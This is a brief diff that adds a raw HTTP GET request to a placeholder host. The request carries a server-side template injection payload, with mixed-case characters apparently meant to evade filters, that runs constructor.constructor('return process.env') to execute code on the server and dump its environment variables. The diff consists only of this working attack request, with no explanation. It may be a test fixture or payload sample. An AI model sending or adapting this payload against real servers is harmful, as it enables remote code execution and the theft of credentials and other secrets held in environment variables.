@@ -1,0 +1,4 @@
+GET /a?cmd={{%20'a'.ToUpPeRcAsE()%20}}{{%20cOnStRuCtOr.CoNsTrUcToR('rEtUrN%20pRoCeSs.EnV')()%20}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
